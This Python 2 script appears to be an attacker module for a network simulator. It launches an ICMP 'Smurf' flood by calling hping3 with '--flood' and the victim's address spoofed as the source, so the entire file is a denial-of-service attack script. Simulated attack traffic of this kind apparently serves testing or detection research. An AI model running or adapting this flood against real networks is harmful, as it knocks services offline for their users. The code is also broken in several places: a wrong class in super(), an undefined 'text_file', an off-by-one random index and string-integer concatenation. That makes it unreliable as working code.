#! /usr/bin/env python

from HostBehaviour import HostModule
from simulator import hosts
import sys
import httplib
import time

from random import randint

import subprocess
import os

class ICMPSmurfFloodAttacker(HostModule):
	def __init__(self, *args):
		super(HTTPClient, self).__init__(*args)

	def clientBehaviour(self):
		# parse parameters for the target/type of attack etc.

		# parse the traffic class id
		payload = open("payload.txt", "w")
		payload.write("class=%s" % self.trafficClass)
		text_file.close()

		smurf = hosts[randint(0, len(hosts))]

		# ICMP "Smurf" attack
		# 10.1.255.255 broadcast adderess
		bashCommand	= "hping3 " + smurf.IP() + " -1 -s " + self.selfPort + " --flood -a " \
			+ self.targetIPAddr

		my_env = os.environ.copy()
		process = subprocess.Popen(bashCommand.split())

		output, error = process.communicate()

if __name__ == '__main__':
	selfIPAddress = sys.argv[1]
	selfPort = int(sys.argv[2])
	targetIPAddress = sys.argv[3]
	targetPort = int(sys.argv[4])
	trafficClass = sys.argv[5]

	# the regular client takes the address and port assigned to it
	# the attacker will also need to include the address and the port it wishes to target

	host = ICMPSmurfFloodAttacker(selfIPAddress, int(selfPort), targetIPAddress, int(targetPort), trafficClass)
	host.clientExecute()
